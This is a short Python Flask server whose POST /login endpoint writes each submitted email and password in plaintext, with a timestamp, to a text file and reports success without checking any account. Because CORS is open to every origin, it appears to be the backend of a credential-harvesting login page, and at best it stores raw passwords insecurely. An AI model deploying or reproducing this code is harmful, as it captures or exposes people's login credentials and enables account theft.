import time
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Включение CORS для всего приложения

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')

    timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
    log_entry = f'{timestamp} - Email: {email}, Password: {password}\n'

    with open('login_attempts.txt', 'a') as f:
        f.write(log_entry)

    return 'Login attempt successfully recorded', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
